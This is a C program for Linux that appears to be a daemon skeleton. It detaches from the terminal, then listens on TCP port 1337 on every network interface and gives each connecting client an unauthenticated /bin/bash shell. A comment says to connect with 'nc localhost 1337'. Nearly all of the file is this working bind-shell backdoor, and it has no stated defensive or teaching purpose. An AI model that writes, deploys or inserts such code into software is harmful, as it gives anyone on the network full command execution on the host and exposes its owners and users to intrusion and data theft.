#include <time.h> 
#include <stdio.h>
#include <signal.h>
#include <syslog.h>
#include <errno.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>
#include <sys/reboot.h>
#include <sys/stat.h> 
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>

//usage: nc localhost 1337
//TODO: cfg file?
//      pid entry
//      stdin stdout dup?

#define DAEMON_NAME "simpledaemon"



const char *DeamonName = "hansWurst";

int pidFilehandle;

static void DaemonExitHandler ( void )
{
    close ( pidFilehandle );
}

static void SignalHandler ( const int Signal )
{
    switch ( Signal )
    {
    case SIGHUP:
        syslog ( LOG_WARNING, "Received SIGHUP signal." );
        break;
    case SIGINT:
            syslog ( LOG_WARNING, "Received SIGINT signal, REBOOT." );
//        sync();
//       reboot ( RB_AUTOBOOT );
        break;
    case SIGTERM:
        syslog ( LOG_INFO, "Daemon exiting" );
        DaemonExitHandler();
        exit ( EXIT_SUCCESS );
        break;
    default:
        syslog ( LOG_WARNING, "Unhandled signal %s", strsignal ( Signal ) );
        break;
    }

}


static void DaemonSkeleton ( const char *rundir, const char *pidfile )
{
    int pid, sid, i;
    char str[100];
    struct sigaction newSigAction;
    sigset_t newSigSet;

    /* Check if parent process id is set */
    if ( getppid() == 1 )
    {
        /* PPID exists, therefore we are already a daemon */
        return;
    }

    /* Set signal mask - signals we want to block */
    sigemptyset ( &newSigSet );
    sigaddset ( &newSigSet, SIGCHLD ); /* ignore child - i.e. we don't need to wait for it */
    sigaddset ( &newSigSet, SIGTSTP ); /* ignore Tty stop signals */
    sigaddset ( &newSigSet, SIGTTOU ); /* ignore Tty background writes */
    sigaddset ( &newSigSet, SIGTTIN ); /* ignore Tty background reads */
    sigprocmask ( SIG_BLOCK, &newSigSet, NULL ); /* Block the above specified signals */

    /* Set up a signal handler */
    newSigAction.sa_handler = SignalHandler;
    sigemptyset ( &newSigAction.sa_mask );
    newSigAction.sa_flags = 0;

    /* Signals to handle */
    sigaction ( SIGHUP, &newSigAction, NULL );  /* catch hangup signal */
    sigaction ( SIGTERM, &newSigAction, NULL ); /* catch term signal */
    sigaction ( SIGINT, &newSigAction, NULL );  /* catch interrupt signal */


    /* Fork*/
    pid = fork();

    if ( pid < 0 )
    {
        exit ( EXIT_FAILURE );
    }

    if ( pid > 0 )
    {
        printf ( "Child process created: %d\n", pid );
        exit ( EXIT_SUCCESS );
    }

    /* Child continues */
    umask ( 027 ); /* Set file permissions 750 */

    /* Get a new process group */
    sid = setsid();
    if ( sid < 0 )
    {
        exit ( EXIT_FAILURE );
    }

    for ( i = getdtablesize(); i >= 0; --i )
    {
        close ( i );
    }

    /* Route I/O connections */
    /* Open STDIN */
   i = open ( "/dev/null", O_RDWR );
    /* STDOUT */
   dup ( i );
    /* STDERR */
   dup ( i );

    chdir ( rundir ); /* change running directory */

    /* Ensure only one copy */
    pidFilehandle = open ( pidfile, O_RDWR|O_CREAT, 0600 );

    if ( pidFilehandle == -1 )
    {
        syslog ( LOG_INFO, "Could not open PID lock file %s, exiting", pidfile );
        exit ( EXIT_FAILURE );
    }

    if ( lockf ( pidFilehandle,F_TLOCK,0 ) == -1 )
    {
        syslog ( LOG_INFO, "Could not lock PID lock file %s, exiting", pidfile );
        exit ( EXIT_FAILURE );
    }

    sprintf ( str,"<html>%d\n</html>",getpid() );
    write ( pidFilehandle, str, strlen ( str ) );
    syslog ( LOG_INFO, "...running..." );

}




int main()
{
    setlogmask ( LOG_UPTO ( LOG_INFO ) );
    openlog ( DAEMON_NAME, LOG_CONS | LOG_PERROR, LOG_USER );

    syslog ( LOG_INFO, "...starting..." );

    /* Deamonize */
    DaemonSkeleton ( "/", "/tmp/rtsh.pid" );        //TODO 


 
    int l_fd = 0, c_fd = 0;
    struct sockaddr_in serv_addr; 


    l_fd = socket(AF_INET, SOCK_STREAM, 0);
    memset(&serv_addr, '0', sizeof(serv_addr));

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    serv_addr.sin_port = htons(1337); 

    bind(l_fd, (struct sockaddr*)&serv_addr, sizeof(serv_addr)); 

    listen(l_fd, 10); 
    while((c_fd = accept(l_fd, (struct sockaddr*)NULL, NULL))) 
    {

        for(int i = 0; i <= 2; i++)
            dup2(c_fd, i);

        system("/bin/bash");
        close(c_fd);
    }
    //syslog ( LOG_ERR, "...Ups, i killed myself..." );
    return 0; 
}
